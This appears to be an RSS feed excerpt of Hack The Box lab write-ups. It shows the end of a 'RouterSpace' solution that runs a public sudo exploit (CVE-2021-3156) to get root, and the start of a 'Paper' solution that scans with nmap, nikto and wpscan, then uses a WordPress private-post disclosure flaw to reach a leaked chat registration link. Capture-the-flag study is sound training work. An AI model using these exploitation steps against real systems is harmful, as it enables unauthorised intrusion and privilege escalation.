font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb8-27">      <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">^~~~~~</span></span>
<span id="cb8-28"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mkdir</span> libnss_X</span>
<span id="cb8-29"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gcc</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-g</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-fPIC</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-shared</span> sice.c <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> libnss_X/X.so.2</span>
<span id="cb8-30"></span>
<span id="cb8-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul@routerspace:/dev/shm/sudo-exploit-main$</span> ./exploit </span>
<span id="cb8-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@routerspace:/dev/shm/sudo-exploit-main#</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /root/root.txt</span>
<span id="cb8-33"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb8-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3d6de1c1362a1d59bd130fd45d895e45</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="references" class="level1">
<h1>References</h1>
<p><strong>Install Anbox:</strong> https://docs.anbox.io/userguide/install_kernel_modules.html</p>
<p><strong>CVE-2021-3156:</strong> https://github.com/redhawkeye/sudo-exploit</p>


</section>

 ]]></description>
  <category>hackthebox</category>
  <category>easy</category>
  <category>linux</category>
  <category>apk</category>
  <category>anbox</category>
  <category>adb</category>
  <guid>https://exploit.se/posts/2022-03-28-htb-writeup-routerspace/2022-03-28-htb-writeup-routerspace.html</guid>
  <pubDate>Mon, 28 Mar 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-03-28-htb-writeup-routerspace/images/routerspace_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Paper - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-02-16-htb-writeup-paper/2022-02-16-htb-writeup-paper.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.143   </span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>    STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>  open  ssh</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>  open  http</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">443/tcp</span> open  https</span>
<span id="cb1-6"></span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80,443</span> 10.10.11.143</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>    STATE SERVICE  VERSION</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>  open  ssh      OpenSSH 8.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2048</span> 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>  open  http     Apache httpd 2.4.37 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">centos</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OpenSSL/1.1.1k</span> mod_fcgid/2.3.9<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-generator:</span> HTML Tidy for HTML5 for Linux version 5.7.28</span>
<span id="cb1-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http-methods:</span> </span>
<span id="cb1-17"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  Potentially risky methods: TRACE</span>
<span id="cb1-18"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Apache/2.4.37 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">centos</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OpenSSL/1.1.1k</span> mod_fcgid/2.3.9</span>
<span id="cb1-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> HTTP Server Test Page powered by CentOS</span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">443/tcp</span> open  ssl/http Apache httpd 2.4.37 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">centos</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OpenSSL/1.1.1k</span> mod_fcgid/2.3.9<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-generator:</span> HTML Tidy for HTML5 for Linux version 5.7.28</span>
<span id="cb1-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http-methods:</span> </span>
<span id="cb1-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  Potentially risky methods: TRACE</span>
<span id="cb1-24"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Apache/2.4.37 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">centos</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OpenSSL/1.1.1k</span> mod_fcgid/2.3.9</span>
<span id="cb1-25"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> HTTP Server Test Page powered by CentOS</span>
<span id="cb1-26"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US</span>
<span id="cb1-27"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: DNS:localhost.localdomain</span>
<span id="cb1-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2021-07-03T08:52:34</span>
<span id="cb1-29"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2022-07-08T10:32:34</span>
<span id="cb1-30"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> TLS randomness does not represent time</span>
<span id="cb1-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tls-alpn:</span> </span>
<span id="cb1-32"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  http/1.1</span>
<span id="cb1-33"></span>
<span id="cb1-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> sudo nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>50 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 10.10.11.143                                                                                                      1 ⨯</span>
<span id="cb1-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE         SERVICE</span>
<span id="cb1-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5353/udp</span> open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> zeroconf</span></code></pre></div>
<p><strong>nikto:</strong></p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span> 80:</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> Server: Apache/2.4.37 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">centos</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OpenSSL/1.1.1k</span> mod_fcgid/2.3.9</span>
<span id="cb2-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> Uncommon header <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'x-backend-server'</span> found, with contents: office.paper</span>
<span id="cb2-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> Retrieved x-powered-by header: PHP/7.2.24</span>
<span id="cb2-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span>
<span id="cb2-6"></span>
<span id="cb2-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span> 443:</span>
<span id="cb2-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> SSL Info:        Subject:  /C=US/O=Unspecified/CN=localhost.localdomain/emailAddress=root@localhost.localdomain</span>
<span id="cb2-9">                   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ciphers:</span>  TLS_AES_256_GCM_SHA384</span>
<span id="cb2-10">                   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Issuer:</span>   /C=US/O=Unspecified/OU=ca-3899279223185377061/CN=localhost.localdomain/emailAddress=root@localhost.localdomain</span>
<span id="cb2-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> Server: Apache/2.4.37 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">centos</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OpenSSL/1.1.1k</span> mod_fcgid/2.3.9</span></code></pre></div>
<p><strong>wpscan:</strong></p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> wpscan <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--url</span> http://office.paper <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--enumerate</span> ap</span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Headers</span>
<span id="cb3-3"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Interesting</span> Entries:</span>
<span id="cb3-4"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> Server: Apache/2.4.37 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">centos</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OpenSSL/1.1.1k</span> mod_fcgid/2.3.9</span>
<span id="cb3-5"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> X-Powered-By: PHP/7.2.24</span>
<span id="cb3-6"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> X-Backend-Server: office.paper</span>
<span id="cb3-7"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Found</span> By: Headers <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Passive</span> Detection<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-8"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Confidence:</span> 100%</span>
<span id="cb3-9"></span>
<span id="cb3-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> WordPress readme found: http://office.paper/readme.html</span>
<span id="cb3-11"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Found</span> By: Direct Access <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Aggressive</span> Detection<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-12"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Confidence:</span> 100%</span>
<span id="cb3-13"></span>
<span id="cb3-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> WordPress version 5.2.3 identified <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Insecure,</span> released on 2019-09-05<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb3-15"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Found</span> By: Rss Generator <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Passive</span> Detection<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-16"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> http://office.paper/index.php/feed/, <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>generator<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>https://wordpress.org/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>v=5.2.3<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/generator<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb3-17"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> http://office.paper/index.php/comments/feed/, <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>generator<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>https://wordpress.org/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>v=5.2.3<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/generator<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb3-18"></span>
<span id="cb3-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> WordPress theme in use: construction-techup</span>
<span id="cb3-20"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Location:</span> http://office.paper/wp-content/themes/construction-techup/</span>
<span id="cb3-21"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Last</span> Updated: 2021-07-17T00:00:00.000Z</span>
<span id="cb3-22"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Readme:</span> http://office.paper/wp-content/themes/construction-techup/readme.txt</span>
<span id="cb3-23"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[!]</span> The version is out of date, the latest version is 1.4</span>
<span id="cb3-24"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Style</span> URL: http://office.paper/wp-content/themes/construction-techup/style.css<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>ver=1.1</span>
<span id="cb3-25"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Style</span> Name: Construction Techup</span>
<span id="cb3-26"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">author:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0xPThree"</span></span>
<span id="cb3-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">description:</span> Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...</span>
<span id="cb3-28"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Author:</span> wptexture</span>
<span id="cb3-29"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Author</span> URI: https://testerwp.com/</span>
<span id="cb3-30"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb3-31"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Found</span> By: Css Style In Homepage <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Passive</span> Detection<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-32"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb3-33"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Version:</span> 1.1 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80%</span> confidence<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-34"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Found</span> By: Style <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Passive</span> Detection<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-35"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> http://office.paper/wp-content/themes/construction-techup/style.css<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>ver=1.1, Match: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Version: 1.1'</span></span>
<span id="cb3-36"></span>
<span id="cb3-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Enumerating All Plugins <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">via</span> Passive Methods<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-38"></span>
<span id="cb3-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[i]</span> No plugins Found.</span></code></pre></div>
<ul>
<li>Nikto is MVP and finds <code>office.paper</code></li>
<li><code>http://office.paper/</code> is running on WP 5.2.3</li>
</ul>
<hr>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Looking for WP 5.2.3 vulnerabilities we find a unauthed view of private posts.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">┌──</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void㉿void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-[/htb/paper]</span></span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">└─$</span> searchsploit wordpress 5.2.3</span>
<span id="cb4-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb4-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">WordPress</span> Core <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> 5.2.3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Viewing Unauthenticated/Password/Private Posts                    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">multiple/webapps/47690.md</span></span></code></pre></div>
<p>Reading about the vulnerability it is as simple as adding <code>?static=1</code> to view posts. <code>http://office.paper/?static=1</code> gives us:</p>
<blockquote class="blockquote">
<p>“Micheal please remove the secret from drafts for gods sake!” “Michael, you have to stop putting secrets in the drafts.” “# Secret Registration URL of new Employee chat system http://chat.office.paper/register/8qozr226AhkCHZdyY” “# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders.”</p>
</blockquote>
<p>Use the provided link and create an account to the rocket.chat platform.</p>
<p>Reading the General chat we see that Dwight has created the bot <code>Recyclops</code> that is able to list- and fetch files. Start a private conversation with <code>Recyclops</code> and enumerate.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> list</span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Fetching</span> the directory listing of /sales/</span>
<span id="cb5-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 8</span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 4 dwight dwight 32 Jul 3 2021 .</span>
